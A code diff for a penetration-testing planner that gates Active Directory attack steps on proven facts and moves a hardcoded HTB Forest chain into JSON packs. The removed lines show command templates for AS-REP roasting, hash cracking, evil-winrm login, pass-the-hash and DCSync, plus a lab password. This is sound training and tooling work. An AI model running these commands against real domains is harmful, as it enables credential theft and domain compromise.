@@ -1,43 +1,52 @@
-"""Methodology pack: fact-gated actions, plus the tiny planner over them.
+"""Methodology packs: fact-gated actions loaded from data, plus the planner.
 
 An Action is a methodology branch expressed as data: what facts must already be
-proven for it to make sense (`requires_*`), what a successful run can prove
-(`produces`), and — crucially — what it does *not* prove. The planner does no
-cleverness: it only asks which actions are unlocked by the current facts, which
-are blocked and why, and ranks the unlocked ones.
+proven for it to apply (`requires_*`), what a successful run can prove
+(`produces`, as fact kinds), and — conservatively derived — what it does *not*
+prove. The planner does no cleverness: it asks which actions the current facts
+unlock, which are blocked and why, and ranks the unlocked ones.
 
-Today this module hardcodes a small Active Directory chain for HTB Forest. That
-is temporary scaffolding. The real foundation is the ~334 Orange-derived atomic
-units and the OSCP web/privesc branches that live in the old obol data layer;
-this pack is the shape they get exported into. Keeping the definitions as data
-(not planner code) is what lets that swap happen without touching the planner.
+Packs live as JSON under obol/packs/ and are loaded here. The default pack is the
+Active Directory set exported from the Orange Cyberdefense 2025.03 methodology
+(see obol/packs/NOTICE.md) — the grounded replacement for the earlier hardcoded
+Forest placeholder. Keeping actions as data, not planner code, is what let that
+swap happen without touching the planner.
 """
 from __future__ import annotations
 
+import json
 from dataclasses import dataclass, field
+from pathlib import Path
 
 from .facts import Fact, FactSet, ProofState
+
+PACKS_DIR = Path(__file__).parent / "packs"
+DEFAULT_PACK = "orange_ad_2025_03"
 
 
 @dataclass
 class Action:
     id: str
     title: str
-    tool: str
-    command: str                       # template; {target} {domain} {basedn} {user} {password} {hash}
-    proves: str
-    does_not_prove: str
+    tool: str = ""
+    command: str = ""                  # primary command template (first of `commands`)
+    proves: str = ""
+    does_not_prove: str = ""
     priority: int = 50
     requires_all: list[str] = field(default_factory=list)
     requires_any: list[str] = field(default_factory=list)
-    produces: list[dict] = field(default_factory=list)  # [{"kind":..., "value":{...}}]
+    produces: list[str] = field(default_factory=list)   # fact kinds
+    hypothesis: str = ""
+    tools: list[str] = field(default_factory=list)
+    os: list[str] = field(default_factory=list)
+    report: dict | None = None
+    refs: list[str] = field(default_factory=list)
+    commands: list[dict] = field(default_factory=list)  # [{tool, run, note}]
 
-    # ---- gating logic --------------------------------------------------------
     def produced_kinds(self) -> set[str]:
-        return {p["kind"] for p in self.produces}
+        return set(self.produces)
 
     def settled(self, facts: FactSet) -> bool:
-        """True once everything this action can prove is already proven."""
         pk = self.produced_kinds()
         return bool(pk) and pk.issubset(facts.kinds())
 
@@ -49,176 +58,100 @@ class Action:
         return True
 
     def unmet(self, facts: FactSet) -> str:
-        """A human reason this action is currently blocked."""
         for k in self.requires_all:
             if not facts.has(k):
-                return f"blocked until {_friendly(k)}"
+                return f"blocked until {friendly(k)} exists"
         if self.requires_any and not any(facts.has(k) for k in self.requires_any):
-            alts = " or ".join(_friendly(k) for k in self.requires_any)
+            alts = " or ".join(friendly(k) for k in self.requires_any)
             return f"blocked until {alts}"
         return "blocked"
 
+    @classmethod
+    def from_json(cls, d: dict) -> "Action":
+        cmds = d.get("commands", [])
+        return cls(
+            id=d["id"], title=d.get("title", d["id"]),
+            tool=d.get("tool", ""),
+            command=(cmds[0]["run"] if cmds else d.get("command", "")),
+            proves=d.get("proves", ""), does_not_prove=d.get("does_not_prove", ""),
+            priority=int(d.get("priority", 50)),
+            requires_all=list(d.get("requires_all", [])),
+            requires_any=list(d.get("requires_any", [])),
+            produces=list(d.get("produces", [])),
+            hypothesis=d.get("hypothesis", ""), tools=list(d.get("tools", [])),
+            os=list(d.get("os", [])), report=d.get("report"),
+            refs=list(d.get("refs", [])), commands=list(cmds),
+        )
 
-# Friendly phrases for fact kinds, used in blocked reasons and the board.
+
+# --------------------------------------------------------------------------- #
+# friendly fact-kind phrasing (blocked reasons, board)                         #
+# --------------------------------------------------------------------------- #
 _FRIENDLY = {
-    "ad.domain": "the domain is known",
-    "ad.user": "at least one domain user is known",
-    "ad.naming_context": "the LDAP naming context is known",
-    "cred.material.asrep_hash": "an AS-REP hash is captured",
-    "cred.material.nt_hash": "an NT hash is captured",
-    "cred.valid": "a valid credential exists",
-    "access.authenticated": "authenticated access exists",
-    "access.domain_admin": "domain-admin context exists",
-    "ldap.reachable": "LDAP is reachable",
-    "winrm.reachable": "WinRM is reachable",
-    "smb.reachable": "SMB is reachable",
+    "ad.dc_candidate": "a domain-controller candidate", "ad.domain_known": "the domain",
+    "ad.base_dn": "the LDAP base DN", "ad.user_list": "a domain user list",
+    "ad.anonymous_bind": "anonymous LDAP bind", "ad.graph.collected": "the AD graph",
+    "ad.attack_paths": "attack paths", "ad.control_paths": "object-control paths",
+    "ad.trusts": "domain trusts", "ad.computer_added": "an added computer account",
+    "hash.asrep": "an AS-REP hash", "hash.tgs": "a Kerberoast hash", "hash.ntlm": "NTLM hashes",
+    "hash.krbtgt": "the krbtgt hash", "hash.tgt": "a TGT",
+    "credential.candidate": "candidate credentials", "credential.available": "a usable credential",
+    "credential.admin": "an admin credential", "credential.certificate": "certificate material",
+    "credential.ntlm_hash": "an NT hash", "credential.plaintext": "a plaintext password",
+    "kerberos.tickets": "Kerberos tickets", "kerberos.reachable": "Kerberos is reachable",
+    "ldap.reachable": "LDAP is reachable", "smb.reachable": "SMB is reachable",
+    "access.admin": "administrative access", "access.system": "SYSTEM access",
+    "access.desktop": "an interactive desktop", "foothold.windows": "a Windows foothold",
+    "loot.ntds": "NTDS secrets", "adcs.vulnerable": "a vulnerable ADCS template",
+    "persistence.domain": "domain persistence", "enum.deep": "deep enumeration",
+    "vuln.candidates": "vulnerability candidates", "relay.success": "a successful relay",
+    "config.review": "config review", "lateral.movement": "lateral movement",
 }
 
 
-def _friendly(kind: str) -> str:
-    return _FRIENDLY.get(kind, kind)
+def friendly(kind: str) -> str:
+    if kind in _FRIENDLY:
+        return _FRIENDLY[kind]
+    if kind.startswith("port:"):
+        return f"port {kind.split(':', 1)[1]} open"
+    return kind
 
 
 # --------------------------------------------------------------------------- #
-# HTB Forest methodology chain (placeholder for the Orange-derived pack)       #
+# pack loading                                                                 #
 # --------------------------------------------------------------------------- #
-FOREST_PACK: list[Action] = [
-    Action(
-        id="ldap-anon-enum",
-        title="Anonymous LDAP domain enumeration",
-        tool="ldapsearch",
-        command='ldapsearch -x -H ldap://{target} -b "{basedn}"',
-        proves="anonymous LDAP bind is allowed and domain objects (naming context, users) are readable without credentials",
-        does_not_prove="any credential, or authenticated access",
-        priority=90,
-        requires_all=["ad.domain"],
-        requires_any=["ldap.reachable"],
-        produces=[
-            {"kind": "ad.naming_context", "value": {"dn": "DC=htb,DC=local"}},
-            {"kind": "ad.anon_bind", "value": {"allowed": True}},
-            {"kind": "ad.user", "value": {"sam": "svc-alfresco"}},
-            {"kind": "ad.user", "value": {"sam": "sebastien"}},
-            {"kind": "ad.user", "value": {"sam": "andy"}},
-            {"kind": "ad.user", "value": {"sam": "mark"}},
-            {"kind": "ad.user", "value": {"sam": "santi"}},
-            {"kind": "ad.user", "value": {"sam": "lucinda"}},
-        ],
-    ),
-    Action(
-        id="asrep-roast",
-        title="AS-REP roast pre-auth-disabled users",
-        tool="impacket-GetNPUsers",
-        command="impacket-GetNPUsers {domain}/{user} -dc-ip {target} -no-pass",
-        proves="svc-alfresco has Kerberos pre-authentication disabled; an AS-REP hash (crackable material) was captured",
-        does_not_prove="a valid credential, or any access",
-        priority=80,
-        requires_all=["ad.domain"],
-        requires_any=["ad.user"],   # candidate users from ANY source — no separate kerbrute step needed
-        produces=[
-            {"kind": "cred.material.asrep_hash", "value": {
-                "user": "svc-alfresco",
-                "hash": "$krb5asrep$23$svc-alfresco@HTB.LOCAL:fef58ddc...<snip>",
-            }},
-        ],
-    ),
-    Action(
-        id="crack-asrep",
-        title="Crack the AS-REP hash offline",
-        tool="john",
-        command="john hash --wordlist=/usr/share/wordlists/rockyou.txt",
-        proves="the AS-REP hash cracked to a cleartext password",
-        does_not_prove="that the credential grants access anywhere — it must be validated",
-        priority=78,
-        requires_all=["cred.material.asrep_hash"],
-        produces=[
-            {"kind": "cred.valid", "value": {"user": "svc-alfresco", "password": "s3rvice"}},
-        ],
-    ),
-    Action(
-        id="winrm-auth",
-        title="Validate the credential over WinRM",
-        tool="evil-winrm",
-        command="evil-winrm -i {target} -u {user} -p '{password}'",
-        proves="the credential authenticates over WinRM — an interactive session as svc-alfresco",
-        does_not_prove="administrator/SYSTEM on the host, or any domain privilege",
-        priority=85,
-        requires_all=["cred.valid"],
-        requires_any=["winrm.reachable"],
-        produces=[
-            {"kind": "access.authenticated", "value": {"user": "svc-alfresco", "host": "10.10.10.161", "admin": False}},
-        ],
-    ),
-    Action(
-        id="bloodhound-collect",
-        title="Collect the AD graph from an authenticated context",
-        tool="bloodhound-python",
-        command="bloodhound-python -u {user} -p '{password}' -d {domain} -c All -ns {target}",
-        proves="the domain object/ACL graph was collected from an authenticated context",
-        does_not_prove="any specific escalation path — the graph must be analyzed",
-        priority=70,
-        requires_any=["access.authenticated", "cred.valid"],
-        produces=[
-            {"kind": "ad.graph.collected", "value": {}},
-        ],
-    ),
-    # ---- deliberately blocked, to show the honest negative space ----
-    Action(
-        id="pass-the-hash",
-        title="Pass-the-hash over SMB",
-        tool="nxc",
-        command="nxc smb {target} -u {user} -H {hash}",
-        proves="the NT hash authenticates over SMB (pass-the-hash)",
-        does_not_prove="administrator context until an admin check confirms it",
-        priority=60,
-        requires_all=["cred.material.nt_hash"],   # never captured in Forest
-        requires_any=["smb.reachable"],
-        produces=[{"kind": "remote.exec", "value": {}}],
-    ),
-    Action(
-        id="dcsync",
-        title="DCSync domain account hashes",
-        tool="impacket-secretsdump",
-        command="impacket-secretsdump -just-dc {domain}/{user}@{target}",
-        proves="domain account hashes replicated via DCSync",
-        does_not_prove="anything until replication rights are actually held",
-        priority=95,
-        requires_all=["access.domain_admin"],     # the real Forest path reaches this via ACL abuse
-        produces=[{"kind": "cred.material.domain_hashes", "value": {}}],
-    ),
-]
+def load_pack(name: str = DEFAULT_PACK) -> list[Action]:
+    path = name if name.endswith(".json") else str(PACKS_DIR / f"{name}.json")
+    data = json.loads(Path(path).read_text())
+    return [Action.from_json(a) for a in data["actions"]]
 
 
 # --------------------------------------------------------------------------- #
-# The planner                                                                  #
+# planner                                                                      #
 # --------------------------------------------------------------------------- #
-def next_actions(facts: FactSet, pack: list[Action] = FOREST_PACK) -> list[Action]:
-    """Unlocked, not-yet-settled actions, highest priority first."""
+def next_actions(facts: FactSet, pack: list[Action] | None = None) -> list[Action]:
+    pack = pack if pack is not None else load_pack()
     live = [a for a in pack if a.eligible(facts) and not a.settled(facts)]
     return sorted(live, key=lambda a: a.priority, reverse=True)
 
 
-def blocked_actions(facts: FactSet, pack: list[Action] = FOREST_PACK) -> list[Action]:
-    """Actions whose prerequisites are not yet met (and not already settled)."""
+def blocked_actions(facts: FactSet, pack: list[Action] | None = None) -> list[Action]:
+    pack = pack if pack is not None else load_pack()
     blocked = [a for a in pack if not a.eligible(facts) and not a.settled(facts)]
     return sorted(blocked, key=lambda a: a.priority, reverse=True)
 
 
 def apply_action(action: Action, facts: FactSet, source: str) -> list[Fact]:
-    """'Run' an action by recording the facts it produces (stubbed execution).
+    """'Run' an action by recording the fact kinds it produces (stubbed execution).
 
-    Later this is where the runner executes the command, a parser reads the real
-    output, and only then are facts recorded. For now the pack's declared
-    `produces` stand in for parsed evidence so the loop visibly advances.
+    Later this is where the runner executes the command and a parser reads real
+    output, recording facts only for what the output actually supports. For now
+    the pack's declared `produces` stand in so the loop visibly advances.
     """
     new: list[Fact] = []
-    for spec in action.produces:
-        fact = Fact(
-            kind=spec["kind"],
-            scope=f"domain:htb.local" if spec["kind"].startswith("ad.") else "host:10.10.10.161",
-            value=dict(spec.get("value", {})),
-            state=ProofState.SUPPORTED,
-            source=source,
-        )
+    for kind in action.produces:
+        scope = "domain:htb.local" if kind.startswith("ad.") else "host:target"
+        fact = Fact(kind=kind, scope=scope, value={}, state=ProofState.SUPPORTED, source=source)
         if facts.add(fact):
             new.append(fact)
     return new
